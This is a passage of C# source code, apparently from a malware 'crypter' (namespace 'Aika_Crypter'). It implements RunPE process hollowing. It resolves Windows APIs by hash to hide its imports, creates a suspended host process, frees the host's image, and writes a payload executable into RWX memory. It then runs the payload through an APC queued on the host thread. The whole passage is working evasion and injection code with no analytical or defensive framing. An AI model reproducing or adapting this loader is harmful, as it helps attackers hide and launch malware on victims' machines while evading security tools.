        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate int t_ResumeThread(IntPtr hThread);

        #endregion

        private static t_ResumeThread ResumeThread;

        #endregion

        #region VirtualQueryEx

        #region Structs

        private enum AllocationProtectEnum : uint
        {
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400
        }

        private enum StateEnum : uint
        {
            MEM_COMMIT = 0x1000,
            MEM_FREE = 0x10000,
            MEM_RESERVE = 0x2000
        }

        private enum TypeEnum : uint
        {
            MEM_IMAGE = 0x1000000,
            MEM_MAPPED = 0x40000,
            MEM_PRIVATE = 0x20000
        }

        private struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public AllocationProtectEnum AllocationProtect;
            public uint RegionSize;
            public StateEnum State;
            public AllocationProtectEnum Protect;
            public TypeEnum Type;
        }

        #endregion

        #region Definitions

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate int t_VirtualQueryEx(
                                    IntPtr hProcess,
                                    IntPtr lpAddress,
                                    out MEMORY_BASIC_INFORMATION lpBuffer,
                                    uint dwLength);

        #endregion

        private static t_VirtualQueryEx VirtualQueryEx;

        #endregion

        #region VirtualFreeEx

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate bool t_VirtualFreeEx(
                                    IntPtr hProcess,
                                    IntPtr lpAddress,
                                    uint dwSize,
                                    uint dwFreeType);

        #endregion

        private static t_VirtualFreeEx VirtualFreeEx;

        #endregion

        #region QueueUserAPC

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate uint t_QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        #endregion

        private static t_QueueUserAPC QueueUserAPC;

        #endregion

        #region NtQueueApcThread

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate int t_NtQueueApcThread(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData, IntPtr opt2, IntPtr opt3);

        #endregion

        private static t_NtQueueApcThread NtQueueApcThread;

        #endregion

        #region KiUserApcDispatcher

        #region Definition

        private delegate void t_KiUserApcDispatcher(IntPtr a, IntPtr b, IntPtr c, IntPtr ContextStart, IntPtr ContextBody);

        #endregion

        private static t_KiUserApcDispatcher KiUserApcDispatcher;

        #endregion

        #region NtAlertResumeThread

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate int t_NtAlertResumeThread(IntPtr ThreadHandle, ref ulong SuspendCount);

        #endregion

        private static t_NtAlertResumeThread NtAlertResumeThread;

        #endregion

        #region NtAllocateVirtualMemory

        #region Definition

        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true)]
        private delegate int t_NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, uint ZeroBits, ref uint RegionSize, uint AllocationType, uint Protect);

        #endregion

        private static t_NtAllocateVirtualMemory NtAllocateVirtualMemory;

        #endregion

        private static T LoadFunction<T>(IntPtr lpModuleBase, uint dwFunctionHash)
        {

            IntPtr lpFunction = GetProcAddress(lpModuleBase, dwFunctionHash);

            if (IntPtr.Zero == lpFunction)
                return default(T);

            return (T)Convert.ChangeType(Marshal.GetDelegateForFunctionPointer(lpFunction, typeof(T)), typeof(T));
        }

        public static void InitAPI()
        {

            IntPtr lpKernel32 = GetKernel32BaseAddress();
            IntPtr lpNtdll = GetNtdllBaseAddress();

            // kernel32 functions
            CreateProcessW = LoadFunction<t_CreateProcessW>(lpKernel32, 0xA0F20974);
            GetThreadContext = LoadFunction<t_GetThreadContext>(lpKernel32, 0xCF0067E3);
            ReadProcessMemory = LoadFunction<t_ReadProcessMemory>(lpKernel32, 0x3301084);
            NtUnmapViewOfSection = LoadFunction<t_NtUnmapViewOfSection>(lpNtdll, 0x424ED548);
            VirtualAllocEx = LoadFunction<t_VirtualAllocEx>(lpKernel32, 0x99B37A95);
            VirtualProtectEx = LoadFunction<t_VirtualProtectEx>(lpKernel32, 0x687D2F5B);
            VirtualQueryEx = LoadFunction<t_VirtualQueryEx>(lpKernel32, 0x92F50AF2);
            VirtualFreeEx = LoadFunction<t_VirtualFreeEx>(lpKernel32, 0x33A84D20);
            WriteProcessMemory = LoadFunction<t_WriteProcessMemory>(lpKernel32, 0x8C1E9A9B);
            WriteProcessMemory2 = LoadFunction<t_WriteProcessMemory2>(lpKernel32, 0x8C1E9A9B);
            SetThreadContext = LoadFunction<t_SetThreadContext>(lpKernel32, 0xEE430B5F);
            ResumeThread = LoadFunction<t_ResumeThread>(lpKernel32, 0x6426F5F3);
            QueueUserAPC = LoadFunction<t_QueueUserAPC>(lpKernel32, 0x7D81A082);

            // ntdll functions
            NtQueueApcThread = LoadFunction<t_NtQueueApcThread>(lpNtdll, 0x22FA0B1F);
            NtAlertResumeThread = LoadFunction<t_NtAlertResumeThread>(lpNtdll, 0x4E44E6F7);
            NtAllocateVirtualMemory = LoadFunction<t_NtAllocateVirtualMemory>(lpNtdll, 0x3F47E8B);
        }

        private struct HostProcessInfo
        {
            public STARTUPINFO SI;
            public PROCESS_INFORMATION PI;
            public CONTEXT CTX;

            public uint ImageBase;
            public uint ImageSize;
        }

        private static bool InitHostProcess(string pszFormattedPath, ref HostProcessInfo HPI)
        {
            bool bResult;

            STARTUPINFO lpStartupInfo = new STARTUPINFO();
            PROCESS_INFORMATION lpProcessInformation = new PROCESS_INFORMATION();

            // create child process
            bResult = CreateProcessW(
                               null,
                               pszFormattedPath,
                               IntPtr.Zero,
                               IntPtr.Zero,
                               false,
                               0x04,
                               IntPtr.Zero,
                               IntPtr.Zero,
                               ref lpStartupInfo,
                               out lpProcessInformation);


            if (!bResult)
                return false;

            HPI.SI = lpStartupInfo;
            HPI.PI = lpProcessInformation;

            // get peb->ImageBaseAddress of host process
            CONTEXT CTX = new CONTEXT();
            CTX.ContextFlags = (uint)CONTEXT_FLAGS.CONTEXT_ALL;

            // YOU Dont actually need getthreadcontext ->??? you just need peb->Imagebaseaddress
            bResult = GetThreadContext(HPI.PI.hThread, ref CTX);

            if (!bResult)
                return false;

            HPI.CTX = CTX;

            // read peb
            byte[] _readBuffer = new byte[sizeof(uint)];
            IntPtr _outBuffer = IntPtr.Zero;
            // ctx.ebx = peb*
            // ctx.ebx + 8 = ImageBaseAddress
            bResult = ReadProcessMemory(
                            HPI.PI.hProcess,
                            (IntPtr)(HPI.CTX.Ebx + 8),
                            _readBuffer,
                            sizeof(uint),
                            out _outBuffer);

            if (!bResult)
                return false;

            HPI.ImageBase = BitConverter.ToUInt32(_readBuffer, 0);

            // find how much mapped memory we have to work with
            IntPtr lpCurrentAddress = (IntPtr)HPI.ImageBase;
            MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
            // iterate through mapped memory space
            while (VirtualQueryEx(
                            HPI.PI.hProcess,
                            lpCurrentAddress,
                            out mbi,
                            (uint)sizeof(MEMORY_BASIC_INFORMATION)) != 0)
            {
                if (mbi.State == StateEnum.MEM_FREE)
                    break;
                lpCurrentAddress = (IntPtr)((uint)(lpCurrentAddress) + mbi.RegionSize);
            }
            // size of mapped memory ?? == Nt->SizeOfImage
            HPI.ImageSize = (uint)lpCurrentAddress - HPI.ImageBase;

            return bResult;
        }

        private static bool AllocateImageSpace(HostProcessInfo HPI, ref IntPtr newImageBase, uint dwImageBase, uint dwSizeOfImage)
        {
            // attempt to allocate space at the target imagebase (5 times, in case of any NtAllocateVirtualMemory Fails?? , or is this only with VirtualAllocEX...?

            int NT_STAT = -1;
            int dwAttempts = 0;

            IntPtr lpAllocBaseAddress = (IntPtr)dwImageBase;
            uint dwRegionSize = dwSizeOfImage;

            while (dwAttempts < 5)
            {
                NT_STAT = NtAllocateVirtualMemory(HPI.PI.hProcess, ref lpAllocBaseAddress, 0, ref dwRegionSize, 0x3000, 0x40);

                if (NT_STAT == 0 /* yes, i know NT_SUCCESS is not this: but it _should_ not return anything else but 0x00)*/)
                    break;

                dwAttempts++;
            }

            // if we failed to allocate at imagebase, try to allocate it at some random point in process memory...
            if (NT_STAT != 0)
            {
                dwAttempts = 0;
                lpAllocBaseAddress = (IntPtr)dwImageBase;
                dwRegionSize = dwSizeOfImage;

                while (dwAttempts < 5)
                {
                    NT_STAT = NtAllocateVirtualMemory(HPI.PI.hProcess, ref lpAllocBaseAddress, 0, ref dwRegionSize, 0x3000, 0x40);

                    if (NT_STAT == 0)
                        break;

                    dwAttempts++;
                }

                if (NT_STAT != 0)
                    return false;
            }

            newImageBase = lpAllocBaseAddress;

            return true;
        }

        public unsafe static bool Run(byte[] lpExe, string pszApplicationPath, string pszCmdLine)
        {
            bool bResult = false;

            pszApplicationPath = string.Format("\"{0}\"", pszApplicationPath);

            if (!string.IsNullOrEmpty(pszCmdLine))
                pszApplicationPath = string.Join(" ", new string[] { pszApplicationPath, pszCmdLine });

            byte* lpExeBase;

            fixed (byte* lpData = &lpExe[0])
                lpExeBase = lpData;

            // init local structs
            IMAGE_DOS_HEADER pIDH = (IMAGE_DOS_HEADER)Marshal.PtrToStructure((IntPtr)lpExeBase, typeof(IMAGE_DOS_HEADER));
            IMAGE_NT_HEADERS pINH = (IMAGE_NT_HEADERS)Marshal.PtrToStructure((IntPtr)(lpExeBase + pIDH.e_lfanew), typeof(IMAGE_NT_HEADERS));

            if (pIDH.e_magic != 0x5A4D || pINH.Signature != 0x4550)
                return false;

            // init host process
            HostProcessInfo HPI = new HostProcessInfo();
            bResult = InitHostProcess(pszApplicationPath, ref HPI);

            IntPtr v = IntPtr.Zero;

            /* if (pINH.OptionalHeader.ImageBase == HPI.ImageBase &&
                 pINH.OptionalHeader.SizeOfImage <= HPI.ImageSize && false)
             {
                 // use existing memory for our payload exe
                 v = (IntPtr)HPI.ImageBase;
                 uint dwOldProtect = 0;
 
                 bResult = VirtualProtectEx(
                          HPI.PI.hProcess,
                          (IntPtr)HPI.ImageBase,
                          HPI.ImageSize,
                          0x40,
                          ref dwOldProtect);
 
                 if (!bResult)
                     return false;
             }
             else
             {*/

            VirtualFreeEx(HPI.PI.hProcess,
                 (IntPtr)HPI.ImageBase, HPI.ImageSize, 0x8000);

            //NtUnmapViewOfSection(HPI.PI.hProcess, HPI.ImageBase);

            //int NtStatus = NtUnmapViewOfSection(HPI.PI.hProcess, HPI.ImageBase);
            bResult = true; //NtStatus == 0 ? true : false;

            if (!bResult)
                return false;

            // allocate memory for the payload in payload's original imagebase
            //v = VirtualAllocEx(
            //            HPI.PI.hProcess,
            //            (IntPtr)pINH.OptionalHeader.ImageBase,
            //            pINH.OptionalHeader.SizeOfImage,
            //            0x3000,
            //            0x40);

            //int dwAttempts = 0;

            //while (dwAttempts < 5)
            //{
            //    IntPtr lpAllocBaseAddress = (IntPtr)pINH.OptionalHeader.ImageBase;
            //    uint dwAllocRegionSize = pINH.OptionalHeader.SizeOfImage;

            //    int ret = NtAllocateVirtualMemory(HPI.PI.hProcess, ref lpAllocBaseAddress, 0, ref dwAllocRegionSize, 0x3000, 0x40);
            //    v = lpAllocBaseAddress;
            //}

            //IntPtr lpAllocBaseAddress = (IntPtr)pINH.OptionalHeader.ImageBase;
            //uint dwAllocRegionSize = pINH.OptionalHeader.SizeOfImage;

            //int ret = NtAllocateVirtualMemory(HPI.PI.hProcess, ref lpAllocBaseAddress, 0, ref dwAllocRegionSize, 0x3000, 0x40);
            //v = lpAllocBaseAddress;

            IntPtr newV = IntPtr.Zero;
            bResult = AllocateImageSpace(HPI, ref newV, pINH.OptionalHeader.ImageBase, pINH.OptionalHeader.SizeOfImage);
            //  Debugger.Break();

            v = newV;

            if (!bResult)
                return false;

            //  }

            if ((uint)v == 0)
            {
                // could try relocating peb if it has relocation table ?
                // allocate at random place?
            }

            // patch peb->ImageBaseAddress
            byte[] _writeImageBase = BitConverter.GetBytes((uint)v);
            uint dwNumberOfBytesWritten = 0;

            bResult = WriteProcessMemory(
                                HPI.PI.hProcess,
                                (IntPtr)(HPI.CTX.Ebx + 8),
                                _writeImageBase,
                                sizeof(uint),
                                ref dwNumberOfBytesWritten);

            bResult = bResult && dwNumberOfBytesWritten == sizeof(uint) ? true : false;

            if (!bResult)
                return false;

            // patch Nt->ImageBase in payload exe QWORD <-> DWORD
            pINH.OptionalHeader.ImageBase = (uint)v;

            // copy the payload headers
            bResult = WriteProcessMemory(
                                HPI.PI.hProcess,
                                v,
                                lpExe,
                                pINH.OptionalHeader.SizeOfHeaders,
                                ref dwNumberOfBytesWritten);

            bResult = bResult && dwNumberOfBytesWritten == pINH.OptionalHeader.SizeOfHeaders ? true : false;

            if (!bResult)
                return false;

            // copy the payload sections
            for (int i = 0; i < pINH.FileHeader.NumberOfSections; i++)
            {
                uint VirtualAddress = 0;
                uint SizeOfRawData = 0;
                uint PointerToRawData = 0;

                fixed (byte* lpModuleBase = &lpExe[0])
                {
                    uint e_lfanew = *(uint*)(lpModuleBase + 0x3c);
                    byte* ishBase = lpModuleBase + e_lfanew + 0xF8 + (i * 0x28);
                    VirtualAddress = *(uint*)(ishBase + 0xc);
                    SizeOfRawData = *(uint*)(ishBase + 0x10);
                    PointerToRawData = *(uint*)(ishBase + 0x14);
                    *(uint*)(ishBase + 0x1C) = 0xFFFF;
                    *(uint*)(ishBase + 0x20) = 0xFFFF;
                }

                byte[] lpBuffer = new byte[SizeOfRawData];

                Buffer.BlockCopy(lpExe, (int)PointerToRawData, lpBuffer, 0, (int)SizeOfRawData);

                if (SizeOfRawData == 0) /* virtual section */
                    continue;

                bResult = WriteProcessMemory(
                                    HPI.PI.hProcess,
                                    (IntPtr)((uint)v + VirtualAddress),
                                    lpBuffer,
                                    SizeOfRawData,
                                    ref dwNumberOfBytesWritten);

                bResult = (bResult && dwNumberOfBytesWritten == SizeOfRawData);

                if (!bResult)
                    return false;
            }

            if ((uint)v == HPI.ImageBase)
                HPI.CTX.Eax = pINH.OptionalHeader.ImageBase + pINH.OptionalHeader.AddressOfEntryPoint;
            else
                HPI.CTX.Eax = (uint)v + pINH.OptionalHeader.AddressOfEntryPoint;

            NtQueueApcThread(HPI.PI.hThread, (IntPtr)HPI.CTX.Eax, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

            ulong suspend = 0;
            NtAlertResumeThread(HPI.PI.hThread, ref suspend);

            return bResult;
        }

        private static uint FNVHash(string str)
        {
            uint fnv_prime = 0x811C9DC5;
            uint hash = 0;

            for (int i = 0; i < str.Length; i++)
            {
                hash *= fnv_prime;
                hash ^= str[i];
            }

            return hash;
        }

        private static IntPtr GetKernel32BaseAddress()
        {
            foreach (ProcessModule pModule in Process.GetCurrentProcess().Modules)
            {
                if (FNVHash(pModule.ModuleName) == 0x39A15124)
                    return pModule.BaseAddress;
            }

            return IntPtr.Zero;
        }

        private static IntPtr GetNtdllBaseAddress()
        {
            foreach (ProcessModule pModule in Process.GetCurrentProcess().Modules)
            {
                if (FNVHash(pModule.ModuleName) == 0x90CCD0BC)
                    return pModule.BaseAddress;
            }

            return IntPtr.Zero;
        }

        private static IntPtr GetProcAddress(IntPtr lpModuleBase, uint dwFunctionHash)
        {
            IMAGE_DOS_HEADER pIDH;
            IMAGE_NT_HEADERS pINH;

            pIDH = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(lpModuleBase, typeof(IMAGE_DOS_HEADER));

            pINH = (IMAGE_NT_HEADERS)Marshal.PtrToStructure(
               (IntPtr)((uint)lpModuleBase + pIDH.e_lfanew),
                    typeof(IMAGE_NT_HEADERS));

            if (pIDH.e_magic != 0x5A4D)
                return IntPtr.Zero;

            if (pINH.Signature != 0x4550)
                return IntPtr.Zero;

            IMAGE_EXPORT_DIRECTORY pIED = (IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure(
                    (IntPtr)((uint)lpModuleBase + pINH.OptionalHeader.ExportTable.VirtualAddress),
                    typeof(IMAGE_EXPORT_DIRECTORY));

            uint addrFunctions = (uint)lpModuleBase + pIED.AddressOfFunctions;
            uint addrNames = (uint)lpModuleBase + pIED.AddressOfNames;
            uint addrNameOrdinals = (uint)lpModuleBase + pIED.AddressOfNameOrdinals;

            for (uint i = 0; i < pIED.NumberOfNames; i++)
            {
                string pszFunctionName = string.Empty;
                pszFunctionName = Marshal.PtrToStringAnsi((IntPtr)(
                    (uint)lpModuleBase +
                    (uint)Marshal.ReadInt32((IntPtr)(addrNames + (i * 4)))));

                if (FNVHash(pszFunctionName) == dwFunctionHash)
                {
                    IntPtr lpFunctionRet = IntPtr.Zero;
                    lpFunctionRet = (IntPtr)(
                        (uint)lpModuleBase +
                        (uint)Marshal.ReadInt32((IntPtr)((uint)lpModuleBase + pIED.AddressOfFunctions +
                        (4 * Marshal.ReadInt16((IntPtr)((uint)lpModuleBase + pIED.AddressOfNameOrdinals + (i * 2)))))));

                    return lpFunctionRet;
                }
            }

            return IntPtr.Zero;
        }
    }
}
namespace Aika_Crypter
{
    public static class NativeMethods
    {
        public delegate uint ResumeThreadParametrs(IntPtr hThread);
        public static readonly ResumeThreadParametrs ResumeThread = CreateApi<ResumeThreadParametrs>("kernel32", "ResumeThread");

        public delegate bool FlushInstructionCacheParameters(IntPtr hProcess, IntPtr BaseAddress, uint dwSize);
        public static readonly FlushInstructionCacheParameters FlushInstructionCache = CreateApi<FlushInstructionCacheParameters>("kernel32", "FlushInstructionCache");

        public delegate bool VirtualProtectExParameters(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, ref uint lpflOldProtect);
        public static readonly VirtualProtectExParameters VirtualProtectEx = CreateApi<VirtualProtectExParameters>("kernel32", "VirtualProtectEx");

        public delegate uint NtQueryInformationProcessParameters(IntPtr hProcess, uint ProcessInformationClass, ref MenaRunPE.PROCESS_BASIC_INFORMATION ProcessInformation, uint ProcessInformationLength, ref UIntPtr ReturnLength);
        public delegate uint NtQueryInformationProcessParameters2(IntPtr hProcess, uint ProcessInformationClass, ref UIntPtr ProcessInformation, uint ProcessInformationLength, ref UIntPtr ReturnLength);

        public delegate bool ReadProcessMemoryParametrs(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, uint nSize, ref uint lpNumberOfBytesRead);
        public static readonly ReadProcessMemoryParametrs ReadProcessMemory = CreateApi<ReadProcessMemoryParametrs>("kernel32", "ReadProcessMemory");

        public delegate bool WriteProcessMemoryParametrs(IntPtr hProcess, IntPtr lpBaseAddress, [In] byte[] lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);
        public static readonly WriteProcessMemoryParametrs WriteProcessMemory = CreateApi<WriteProcessMemoryParametrs>("kernel32", "WriteProcessMemory");

        public delegate uint NtUnmapViewOfSectionParametrs(IntPtr hProcess, IntPtr pBaseAddress);
        public static readonly NtUnmapViewOfSectionParametrs NtUnmapViewOfSection = CreateApi<NtUnmapViewOfSectionParametrs>("ntdll", "NtUnmapViewOfSection");

        public delegate IntPtr VirtualAllocExParametrs(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        public static readonly VirtualAllocExParametrs VirtualAllocEx = CreateApi<VirtualAllocExParametrs>("kernel32", "VirtualAllocEx");

        public delegate bool IsWow64ProcessParameters(IntPtr hProcess, ref bool Wow64Process);
        public readonly static IsWow64ProcessParameters IsWow64Process = CreateApi<IsWow64ProcessParameters>("kernel32", "IsWow64Process");
        public delegate bool CreateProcessParametrs(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref MenaRunPE.STARTUPINFO startupInfo, ref MenaRunPE.PROCESS_INFORMATION processInformation);
        public static readonly CreateProcessParametrs CreateProcess = CreateApi<CreateProcessParametrs>("kernel32", "CreateProcessA");
        public static readonly NtQueryInformationProcessParameters2 NtQueryInformationProcess2 = CreateApi<NtQueryInformationProcessParameters2>("ntdll", "NtQueryInformationProcess");
        public static readonly NtQueryInformationProcessParameters NtQueryInformationProcess = CreateApi<NtQueryInformationProcessParameters>("ntdll", "NtQueryInformationProcess");

        public delegate IntPtr LoadLibraryParametrs(string name);
        public static readonly LoadLibraryParametrs LoadLibrary = CreateApi<LoadLibraryParametrs>("kernel32", "LoadLibraryA");

        public static T CreateApi<T>(string name, string method)
        {
            return (T)((object)Convert.ChangeType((object)Marshal.GetDelegateForFunctionPointer((IntPtr)GetProcAddress((Int64)GetInternalModuleBaseAddr(name), method), typeof(T)), typeof(T)));
        }
        public static IntPtr GetInternalModuleBaseAddr(string name)
        {
            if (!name.Contains(".dll"))
            {
                name += ".dll";
            }
            IntPtr ModuleBaseAddress = IntPtr.Zero;
            foreach (ProcessModule ProcModule in Process.GetCurrentProcess().Modules)
            {
                if (ProcModule.ModuleName.ToLower() == name)
                {
                    return ProcModule.BaseAddress;
                }
            }
            return LoadLibrary(name);
        }

        public static byte[] ReadByteArray(IntPtr adress, int size)
        {
            byte[] ReturnArray = new byte[size];
            System.Runtime.InteropServices.Marshal.Copy(adress, ReturnArray, 0, size);
            return ReturnArray;
        }
        public static Int64 GetProcAddress(Int64 ModuleAddress, string Export)
        {
            byte[] IExportDir = new byte[0];
            if (IntPtr.Size == 4)
                IExportDir = ReadByteArray((IntPtr)(ModuleAddress + (Int64)Marshal.ReadInt32((IntPtr)(ModuleAddress + (Int64)Marshal.ReadInt32((IntPtr)(ModuleAddress + 60L)) + 120L)) + 24L), 16);
            if (IntPtr.Size == 8)
                IExportDir = ReadByteArray((IntPtr)(ModuleAddress + (Int64)Marshal.ReadInt32((IntPtr)(ModuleAddress + (Int64)Marshal.ReadInt32((IntPtr)(ModuleAddress + 60L)) + 136L)) + 24L), 16);
            for (int i = 0; i < BitConverter.ToInt32(IExportDir, 0); i++)
            {
                int tpAddress = Marshal.ReadInt32((IntPtr)((Int64)BitConverter.ToInt32(IExportDir, 8) + ModuleAddress + (Int64)(i * 4)));
                string ApiString = Encoding.ASCII.GetString(ReadByteArray((IntPtr)(ModuleAddress + (Int64)tpAddress), 64)).Split(char.MinValue)[0];
                int Ord = (int)BitConverter.ToInt16(ReadByteArray((IntPtr)((Int64)BitConverter.ToInt32(IExportDir, 12) + ModuleAddress + (Int64)(i * 2)), 2), 0);
                if (ApiString == Export)
                {
                    return (Int64)BitConverter.ToInt32(ReadByteArray((IntPtr)((Int64)BitConverter.ToInt32(IExportDir, 4) + ModuleAddress + (long)(Ord * 4)), 4), 0) + ModuleAddress;
                }
            }
            return 0L;
        }
    }
}